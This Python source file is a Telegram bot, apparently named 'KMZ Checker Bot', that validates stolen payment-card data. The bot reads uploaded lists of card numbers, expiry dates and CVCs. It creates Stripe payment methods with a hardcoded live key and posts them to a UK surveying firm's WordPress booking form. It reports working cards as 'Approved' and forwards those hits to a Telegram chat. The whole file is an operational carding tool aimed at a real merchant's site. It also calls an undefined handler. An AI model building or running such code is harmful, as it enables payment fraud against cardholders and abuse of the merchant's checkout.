import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, filters
import requests
import asyncio
import pyfiglet
from quart import Quart, request, jsonify
import threading

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Color codes
Z = '\033[1;31m'  # Red
F = '\033[2;32m'  # Green
C = '\033[2;35m'  # Purple

# Display logo
logo = pyfiglet.figlet_format('KMZ BOT')
print(Z + logo)

# Initialize Quart app
app = Quart(__name__)

# Telegram Bot Token from environment
TOKEN = os.getenv('BOT_TOKEN')
if not TOKEN:
    raise ValueError("No BOT_TOKEN environment variable set!")

# Global processing lock and state
processing_lock = threading.Lock()
processing_state = {
    'is_processing': False,
    'current_file': None,
    'position': 0,
    'total': 0
}

async def start(update: Update, context: CallbackContext) -> None:
    """Send welcome message"""
    user = update.effective_user
    await update.message.reply_text(
        f'Hi {user.first_name}! Welcome to KMZ Checker Bot\n\n'
        'Send me a combo file (text file with CC details) to start checking.'
    )

async def help_command(update: Update, context: CallbackContext) -> None:
    """Send help message"""
    await update.message.reply_text(
        'Help: Send me a combo file (text file) with CC details in format:\n'
        'cardnumber|mm|yy|cvc\n\n'
        'Make sure to send your bot token and chat ID first if you haven\'t.'
    )

async def handle_document(update: Update, context: CallbackContext) -> None:
    """Handle received combo file"""
    with processing_lock:
        if processing_state['is_processing']:
            await update.message.reply_text("⚠️ Another file is currently being processed. Please wait.")
            return

        try:
            processing_state['is_processing'] = True
            file = await update.message.document.get_file()
            filename = f'combo_{update.update_id}.txt'
            await file.download_to_drive(filename)
            
            if 'token' not in context.user_data:
                await update.message.reply_text('❌ Please send your Telegram bot token first using /token command')
                return
            
            if 'chat_id' not in context.user_data:
                await update.message.reply_text('❌ Please send your Telegram chat ID first using /chatid command')
                return
            
            # Start processing in background to avoid blocking
            asyncio.create_task(process_combo(update, context, filename))
            
        except Exception as e:
            logger.error(f"Error handling document: {e}")
            await update.message.reply_text("❌ Error processing your file. Please try again.")
            processing_state['is_processing'] = False

async def process_combo(update: Update, context: CallbackContext, combo_file: str):
    """Process the combo file"""
    try:
        token = context.user_data['token']
        chat_id = context.user_data['chat_id']
        
        with open(combo_file, 'r') as file:
            lines = file.readlines()
            total_lines = len(lines)
            processing_state['total'] = total_lines
            
            await update.message.reply_text(f'🔍 Starting to check {total_lines} cards...')
            
            for i in range(processing_state['position'], total_lines):
                processing_state['position'] = i
                P = lines[i].strip()
                
                if not P or '|' not in P:
                    continue

                try:
                    n, mm, yy, cvc = P.split('|')[:4]
                    yy = yy[-2:]
                    cvc = cvc.strip()

                    await asyncio.sleep(10)  # Rate limiting
                    
                    # First API call
                    headers = {
                        'authority': 'api.stripe.com',
                        'accept': 'application/json',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://js.stripe.com',
                        'referer': 'https://js.stripe.com/',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    }

                    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_9sEidmFcTHYDfhGn3zZYH1wG00ZmolhPCV'

                    r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                                     headers=headers, 
                                     data=data,
                                     timeout=30)
                    
                    try:
                        pm = r1.json()['id']
                    except:
                        er = r1.json().get('error', {}).get('message', 'Unknown error')
                        if 'Your card number is incorrect.' in r1.text:
                            await update.message.reply_text(f'[{i+1}/{total_lines}] {P} ➠ Incorrect Number ❌')
                            continue
                        else:
                            await update.message.reply_text(f'[{i+1}/{total_lines}] {P} ➠ Error: {er}')
                            continue

                    await asyncio.sleep(10)  # Rate limiting

                    # Second API call
                    cookies = {
                        '__stripe_mid': 'f7a7e7f3-c831-4eaf-a364-fbacd00d6c389f0a20',
                        '__stripe_sid': 'd6517667-6ed3-4204-9cf8-d7e57068b85bdf3398',
                    }

                    headers = {
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': 'https://fpsurveying.co.uk',
                        'priority': 'u=1, i',
                        'referer': 'https://fpsurveying.co.uk/book/homebuyer-instruction-august-old/',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                        'x-requested-with': 'XMLHttpRequest',
                    }

                    params = {'t': '1744088280834'}

                    data = {
                        'data': f'...{pm}',  # Your existing data string
                        'action': 'fluentform_submit',
                        'form_id': '44',
                    }

                    r2 = requests.post(
                        'https://fpsurveying.co.uk/wp-admin/admin-ajax.php',
                        params=params,
                        cookies=cookies,
                        headers=headers,
                        data=data,
                        timeout=30
                    )
                    
                    if "Your card has insufficient funds" in r2.text:
                        msg = f'''✅ Approved 
💳 CC ➠ {P}
🔹 Result ➠ Approved 
🔹 Gateway ➠ Stripe Auth
━━━━━━━━━━━━━━━━━  
🔹 By ➠ KMZ BOT'''
                        await update.message.reply_text(msg)
                        await send_telegram_alert(token, chat_id, msg)
                    else:
                        await update.message.reply_text(f'[{i+1}/{total_lines}] {P} ➠ Declined ❌')

                except Exception as e:
                    logger.error(f"Error processing line {i+1}: {str(e)}")
                    await update.message.reply_text(f'⚠️ Error processing line {i+1}: {str(e)}')
                    continue

        await update.message.reply_text(f'✅ Finished checking {total_lines} cards!')

    except Exception as e:
        logger.error(f"Error in process_combo: {e}")
        await update.message.reply_text(f'❌ Processing error: {str(e)}')
    finally:
        with processing_lock:
            processing_state['is_processing'] = False
            processing_state['position'] = 0
            processing_state['total'] = 0
        try:
            os.remove(combo_file)
        except:
            pass

async def send_telegram_alert(token: str, chat_id: str, message: str):
    """Send alert to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload, timeout=10)
        response.raise_for_status()
    except Exception as e:
        logger.error(f"Error sending Telegram alert: {e}")

async def handle_token(update: Update, context: CallbackContext) -> None:
    """Handle token input"""
    if len(context.args) == 0:
        await update.message.reply_text("Please provide your bot token after the command: /token YOUR_BOT_TOKEN")
        return
    
    token = ' '.join(context.args)
    context.user_data['token'] = token
    await update.message.reply_text("✅ Bot token saved!")

async def handle_chatid(update: Update, context: CallbackContext) -> None:
    """Handle chat ID input"""
    if len(context.args) == 0:
        await update.message.reply_text("Please provide your chat ID after the command: /chatid YOUR_CHAT_ID")
        return
    
    chat_id = ' '.join(context.args)
    context.user_data['chat_id'] = chat_id
    await update.message.reply_text("✅ Chat ID saved!")

async def status(update: Update, context: CallbackContext) -> None:
    """Check bot status"""
    with processing_lock:
        if processing_state['is_processing']:
            status_msg = f"🔄 Currently processing: {processing_state['position']}/{processing_state['total']} cards"
        else:
            status_msg = "🟢 Bot is idle and ready"
        
        await update.message.reply_text(status_msg)

def setup_application():
    """Initialize and configure the Telegram application"""
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("token", handle_token))
    application.add_handler(CommandHandler("chatid", handle_chatid))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    return application

# Initialize the application properly
application = setup_application()

@app.route(f'/{TOKEN}', methods=['POST'])
async def webhook():
    """Handle incoming updates from Telegram"""
    try:
        json_data = await request.get_json()
        update = Update.de_json(json_data, application.bot)
        
        async with application:
            await application.initialize()
            await application.process_update(update)
            
        return '', 200
    except Exception as e:
        logger.error(f"Error in webhook: {e}")
        return jsonify({"status": "error"}), 500
        
@app.route('/')
async def index():
    """Basic health check endpoint"""
    return 'KMZ Bot is running!'

if __name__ == '__main__':
    # Set webhook URL programmatically
    webhook_url = f"https://your-domain.com/{TOKEN}"
    application.bot.set_webhook(webhook_url)
    
    # Run Quart app
    app.run(host='0.0.0.0', port=8000)
